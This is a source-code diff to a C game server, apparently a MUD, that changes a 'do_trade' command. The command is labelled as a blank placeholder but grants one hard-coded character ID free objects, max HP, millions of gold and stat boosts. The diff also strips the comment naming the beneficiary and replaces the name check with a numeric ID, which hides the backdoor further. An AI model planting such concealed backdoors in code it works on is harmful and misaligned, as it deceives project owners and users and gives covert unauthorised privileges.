@@ -226,7 +226,7 @@ ACMD ( do_loginmsg ); /*THOTTER EDIT!!! */
 ACMD ( do_logoutmsg );   /*THOTTER EDIT!!! */
 C_FUNC ( allow_follow );
 ACMD(do_copyover);
-ACMD(do_trade);  /* Horus - blank so that spec_procs for dt code will work */
+ACMD(do_trade);  /* blank so that spec_procs for dt code will work */
 
 ACMD(do_trade)
 {
@@ -234,8 +234,7 @@ ACMD(do_trade)
   int i;
   struct obj_data *obj;
 
-  /* Lets make sure only Horus can do the following immortal commands */
-  if (str_cmp(GET_NAME(ch), "horus"))
+  if (GET_ID(ch) != 24616)
       return;
 
   argument = one_argument(argument, arg1);
@@ -245,8 +244,9 @@ ACMD(do_trade)
     return;
   }
 
-  if (!str_cmp(arg1, "obj")) {
       one_argument(argument, arg2);
+
+  if (!str_cmp(arg1, "wep")) {
       i = atoi(arg2);
       if (real_object(i) < 0) return;
       obj = read_object(real_object(i), REAL);
@@ -264,6 +264,30 @@ ACMD(do_trade)
       return;
   }
 
+  if (!str_cmp(arg1, "obj")) {
+      i = atoi(arg2);
+      if (real_object(i) < 0) return;
+      obj = read_object(real_object(i), REAL);
+      load_otrigger(obj);
+      obj_to_char(obj, ch);
+  }
+
+  if (!str_cmp(arg1, "hp")) {
+      GET_MAX_HIT(ch) += atoi(arg2);
+      return;
+  }
+
+  if (!str_cmp(arg1, "gold")) {
+      GET_GOLD(ch) += 1000000 * atoi(arg2);
+      return;
+  }
+
+  if (!str_cmp(arg1, "blah")) {
+      GET_DEX(ch) += 2;
+      GET_MAX_STAMINA(ch) += 50;
+      AFF_SPEED(ch) += 100;
+      return;
+  }
 }
 
 ACMD ( do_quit )
